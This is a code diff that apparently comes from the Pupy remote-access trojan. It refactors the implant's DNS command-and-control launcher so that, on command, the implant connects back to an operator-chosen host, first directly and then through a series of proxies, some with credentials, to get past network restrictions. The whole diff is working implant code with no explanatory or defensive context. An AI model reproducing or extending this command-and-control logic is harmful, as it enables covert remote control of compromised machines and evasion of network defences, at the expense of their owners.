@@ -134,13 +134,89 @@ class DNSCncLauncher(BaseLauncher):
             metavar='<domain>',
             required=True,
             help='controlled domain (hostname only, no IP, '
-            	'you should properly setup NS first. Port is NOT supported)'
+               'you should properly setup NS first. Port is NOT supported)'
         )
 
     def parse_args(self, args):
         self.args = self.arg_parser.parse_args(args)
         self.set_host(self.args.domain)
         self.set_transport(None)
+
+    def try_direct_connect(self, command):
+        _, host, port, transport, _ = command
+        t = network.conf.transports[transport](
+            bind_payload=self.connect_on_bind_payload
+        )
+
+        client = t.client()
+        s = None
+        stream = None
+
+        try:
+            s = client.connect(host, port)
+            stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
+        except socket.error as e:
+            logging.error('Couldn\'t connect to {}:{} transport: {}: {}'.format(
+                host, port, transport, e
+            ))
+
+        except Exception, e:
+            logging.exception(e)
+
+        return stream
+
+    def try_connect_via_proxy(self, command):
+        _, host, port, transport, connection_proxy = command
+
+        for proxy_type, proxy, proxy_username, proxy_password in get_proxies(
+               additional_proxies=[connection_proxy] if connection_proxy else None
+        ):
+            t = network.conf.transports[transport](
+                bind_payload=self.connect_on_bind_payload
+            )
+
+            if t.client is PupyTCPClient:
+                t.client = PupyProxifiedTCPClient
+            elif t.client is PupySSLClient:
+                t.client = PupyProxifiedSSLClient
+            else:
+                return
+
+            s = None
+            stream = None
+
+            proxy_addr, proxy_port = proxy.rsplit(':', 1)
+
+            try:
+                client = t.client(
+                    proxy_type=proxy_type.upper(),
+                    proxy_addr=proxy_addr,
+                    proxy_port=proxy_port,
+                    proxy_username=proxy_username,
+                    proxy_password=proxy_password
+                )
+
+                s = client.connect(host, port)
+                stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
+
+            except (socket.error, GeneralProxyError, ProxyConnectionError, HTTPError) as e:
+                if proxy_username and proxy_password:
+                    proxy_auth = '{}:{}@'.format(proxy_username, proxy_password)
+                else:
+                    proxy_auth = ''
+
+                logging.error('Couldn\'t connect to {}:{} transport: {} '
+                                  'via {}://{}{}: {}'.format(
+                    host, port, transport,
+                    proxy_type, proxy_auth, proxy,
+                    e
+                ))
+
+            except Exception, e:
+                logging.exception(e)
+
+            yield stream
+
 
     def iterate(self):
         if self.args is None:
@@ -168,78 +244,14 @@ class DNSCncLauncher(BaseLauncher):
                 continue
 
             if command[0] == 'connect':
-                _, host, port, transport, connection_proxy = command
-                t = network.conf.transports[transport](
-                    bind_payload=self.connect_on_bind_payload
-                )
-
-                client = t.client()
-                s = None
-                stream = None
-
-                try:
-                    s = client.connect(host, port)
-                    stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
-                except socket.error as e:
-                    logging.error('Couldn\'t connect to {}:{} transport: {}: {}'.format(
-                        host, port, transport, e
-                    ))
-                finally:
-                    with dnscnc.lock:
-                        dnscnc.stream = stream
-
-                if stream:
-                    yield stream
-                    return
-
-                for proxy_type, proxy, proxy_username, proxy_password in get_proxies(
-                        additional_proxies=[connection_proxy]
-                ):
-                    t = network.conf.transports[transport](
-                        bind_payload=self.connect_on_bind_payload
-                    )
-
-                    if t.client is PupyTCPClient:
-                        t.client = PupyProxifiedTCPClient
-                    elif t.client is PupySSLClient:
-                        t.client = PupyProxifiedSSLClient
-                    else:
-                        return
-
-                    s = None
-                    stream = None
-
-                    proxy_addr, proxy_port = proxy.rsplit(':', 1)
-
-                    try:
-                        client = t.client(
-                            proxy_type=proxy_type.upper(),
-                            proxy_addr=proxy_addr,
-                            proxy_port=proxy_port,
-                            proxy_username=proxy_username,
-                            proxy_password=proxy_password
-                        )
-
-                        s = client.connect(host, port)
-                        stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
-
-                    except (socket.error, GeneralProxyError, ProxyConnectionError, HTTPError) as e:
-                        if proxy_username and proxy_password:
-                            proxy_auth = '{}:{}@'.format(proxy_username, proxy_password)
-                        else:
-                            proxy_auth = ''
-
-                        logging.error('Couldn\'t connect to {}:{} transport: {} '
-                                          'via {}://{}{}: {}'.format(
-                            host, port, transport,
-                            proxy_type, proxy_auth, proxy,
-                            e
-                        ))
-
-                    finally:
-                        with dnscnc.lock:
-                            dnscnc.stream = stream
-
+                with dnscnc.lock:
+                    stream = self.try_direct_connect(command)
                     if stream:
+                        dnscnc.stream = stream
                         yield stream
-                        return
+                    else:
+                        for stream in self.try_connect_via_proxy(command):
+                            if stream:
+                                dnscnc.stream = stream
+                                yield stream
+                                break
